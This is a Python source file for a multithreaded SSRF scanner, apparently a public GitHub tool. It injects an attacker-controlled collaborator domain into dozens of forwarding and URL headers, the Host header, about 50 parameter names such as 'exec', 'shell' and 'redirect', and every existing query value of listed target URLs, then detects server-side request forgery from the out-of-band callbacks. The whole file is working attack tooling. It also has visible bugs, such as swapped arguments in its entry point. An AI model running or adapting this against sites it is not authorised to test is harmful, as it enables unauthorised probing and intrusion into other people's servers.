import re
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import requests
from urllib.parse import urlparse, parse_qs, urlencode
import urllib
import hashlib
import threading
import optparse


def create_hash(url, place, queue):
    hs = str(hash(f"{url}+{place}")).replace("-", "")
    index = hs + "     " + url + "     " + place + '\n'
    queue.put(index)
    return hs


def req(URL, colab, cookies, hash, queue):
    host = hash + "." + colab
    url = "http://" + host

    host_header = {
        'Proxy-Host': create_hash(URL, 'Proxy-Host', queue) + "." + colab,
        'Real-Ip': create_hash(URL, 'Proxy-Host', queue) + "." + colab,
        'Referer': create_hash(URL, 'Referer', queue) + "." + colab,
        'X-Forwarded-By': create_hash(URL, 'X-Forwarded-By', queue) + "." + colab,
        'X-Forwarded-For': create_hash(URL, 'X-Forwarded-FOR', queue) + "." + colab,
        'X-Forwarded-For-Original': create_hash(URL, 'X-Forwarded-For-Original', queue) + "." + colab,
        'X-Forwarded': create_hash(URL, 'X-Forwarded', queue) + "." + colab,
        'X-Forwarded-Host': create_hash(URL, 'Proxy-Host', queue) + "." + colab,
        'X-Forwarded-Server': create_hash(URL, 'X-Forwarded-Server', queue) + "." + colab,
        'X-Forwarder-For': create_hash(URL, 'X-Forwarder-For', queue) + "." + colab,
        'X-Forward-For': create_hash(URL, 'X-Forward-For', queue) + "." + colab,
        'X-Host': create_hash(URL, 'X-Host', queue) + "." + colab,
        'X-Http-Host-Override': create_hash(URL, 'X-Http-Host-Override', queue) + "." + colab,
        'X-Original-Remote-Addr': create_hash(URL, 'X-Original-Remote-Addr', queue) + "." + colab,
        'X-Real-Ip': create_hash(URL, 'X-Real-Ip', queue) + "." + colab,
        'X-Remote-Addr': create_hash(URL, 'X-Remote-Addr', queue) + "." + colab,
    }

    url_header = {'Base-Url': "https://" + create_hash(URL, 'Base-Url', queue) + "." + colab,
                  'Http-Url': "https://" + create_hash(URL, 'Http-Url', queue) + "." + colab,
                  'Proxy-Url': "https://" + create_hash(URL, 'Proxy-Url', queue) + "." + colab,
                  'Redirect': "https://" + create_hash(URL, 'Redirect', queue) + "." + colab,
                  'Referrer': "https://" + create_hash(URL, 'Referrer', queue) + "." + colab,
                  'Request-Uri': "https://" + create_hash(URL, 'Request-Uri', queue) + "." + colab,
                  'Uri': "https://" + create_hash(URL, 'Uri', queue) + "." + colab,
                  'Url': "https://" + create_hash(URL, 'Url', queue) + "." + colab,
                  'X-Http-Destinationurl': "https://" + create_hash(URL, 'X-Http-Destinationurl', queue) + "." + colab,
                  'X-Original-Url': "https://" + create_hash(URL, 'X-Original-Url', queue) + "." + colab,
                  'X-Proxy-Url': "https://" + create_hash(URL, 'X-Proxy-Url', queue) + "." + colab,
                  'X-Rewrite-Url': "https://" + create_hash(URL, 'X-Rewrite-Url', queue) + "." + colab,
                  }
    #
    requests.get(URL, headers=host_header, timeout=5, cookies=cookies)
    requests.get(URL, headers=url_header, timeout=5,cookies=cookies)
    requests.get(URL, headers={'Host': host}, timeout=5,cookies=cookies)
    parameter_all_in_one(URL, url, cookies=cookies)
    replace_param(URL, url, cookies)
    queue.put(URL)


def parameter_one_by_one(URL, colab, cookies):
    parameters = ["access", "admin", "dbg", "debug", "edit", "grant", "test", "alter", "clone", "create", "delete",
                  "disable", "enable", "exec", "execute", "load", "make", "modify", "rename", "reset", "shell",
                  "toggle", "adm", "root", "cfg", "dest", "redirect", "uri", "path", "continue", "url", "window",
                  "next", "data", "reference", "site", "html", "val", "validate", "domain", "callback", "return",
                  "page", "feed", "host", "port", "to", "out", "view", "dir", "show", "navigation", "open "]

    for param in parameters:
        url = "{}?{}={}".format(URL.split('?')[0], param, colab)
        requests.get(url, cookies=cookies,timeout=5)


def replace_param(URL, colab, cookies):
    parse = urlparse(URL)
    for i in parse_qs(parse.query):
        query = parse_qs(parse.query)
        query[i] = [colab]
        for i in query:
            query[i] = query[i][0]
        q = urlencode(query, doseq=True)
        a = "{}://{}{}?{}".format(parse[0], parse[1], parse[2], q)
        requests.get(a, cookies=cookies,timeout=5)


def parameter_all_in_one(URL, COLAB, cookies):
    parameters = {"access": COLAB, "admin": COLAB, "dbg": COLAB, "debug": COLAB, "edit": COLAB, "grant": COLAB,
                  "test": COLAB, "alter": COLAB, "clone": COLAB, "create": COLAB, "delete": COLAB,
                  "disable": COLAB, "enable": COLAB, "exec": COLAB, "execute": COLAB, "load": COLAB, "make": COLAB,
                  "modify": COLAB, "rename": COLAB, "reset": COLAB, "shell": COLAB,
                  "toggle": COLAB, "adm": COLAB, "root": COLAB, "cfg": COLAB, "dest": COLAB, "redirect": COLAB,
                  "uri": COLAB, "path": COLAB, "continue": COLAB, "url": COLAB, "window": COLAB,
                  "next": COLAB, "data": COLAB, "reference": COLAB, "site": COLAB, "html": COLAB, "val": COLAB,
                  "validate": COLAB, "domain": COLAB, "callback": COLAB, "return": COLAB,
                  "page": COLAB, "feed": COLAB, "host": COLAB, "port": COLAB, "to": COLAB, "out": COLAB, "view": COLAB,
                  "dir": COLAB, "show": COLAB, "navigation": COLAB, "open": COLAB}

    param = urllib.parse.urlencode(parameters, doseq=True)
    URL = "{}?{}".format(URL.split('?')[0], param)
    requests.get(URL, cookies=cookies,timeout=5)


def done(queue, stop_event):
    RED = '\033[31m'
    GREEN = '\033[32m'
    RESET = '\033[0m'
    while not stop_event.is_set():
        data = queue.get()

        if re.search(r"^[0-9]", data):
            # print(data)

            with open("hash_file.txt", "a") as f:
                f.write(data)
        else:
            print("[ {}done{} ] {}".format(GREEN, RESET, data))


def pool(filename,  colab,threads,  cookies):
    print(
        "urls_path=\033[33m{}\033[0m    colab=\033[33m{}\033[0m          threads=\033[33m{}\033[0m  cookies={} ".format(
            filename,  colab,threads, cookies))
    queue = Queue()
    stop_event = threading.Event()
    t = threading.Thread(target=done, args=(queue, stop_event), daemon=True)
    t.start()
    Lines = open(filename, 'r').readlines()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        with open("hash.txt", 'w') as out:
            for i in Lines:
                url = i.replace("\n", "")
                hash = hashlib.sha224(url.encode('UTF-8')).hexdigest()
                executor.submit(req, url, colab, cookies, hash, queue)
    stop_event.set()


def logo():
    print("""  \033[34m    
                           __  __  byMedbsq              
             ___ ___ _ __ / _|/ _|_   _ ________
            / __/ __| '__| |_| |_| | | |_  /_  /
            \__ \__ \ |  |  _|  _| |_| |/ / / / 
            |___/___/_|  |_| |_|  \__,_/___/___|
             https://github.com/medbsq/ssrf.git


     \033[0m
        """)


def Main():
    parser = optparse.OptionParser(" help: \n" + \
                                   "\tssrf_header -f <url_fielname> -c  <colaborato> -t <threads_number> \n")
    parser.add_option("-f", dest="filename", type="string", help="spicify file of urls")
    parser.add_option("-t", dest="threads", type="int", help="spicify nybmer of threads")
    parser.add_option("-c", dest="colab", type="string", help="spicify collaborator")

    (options, args) = parser.parse_args()

    threads = 10
    cookies = None
    if (options.filename != None and options.colab != None):
        colab = options.colab
        if (options.filename != None):
            filename = options.filename
        if (options.threads != None):
            threads = options.threads

    else:
        print(parser.usage)
        exit(1)
    pool(filename, threads, colab, cookies)


if __name__ == '__main__':
    logo()
    Main()

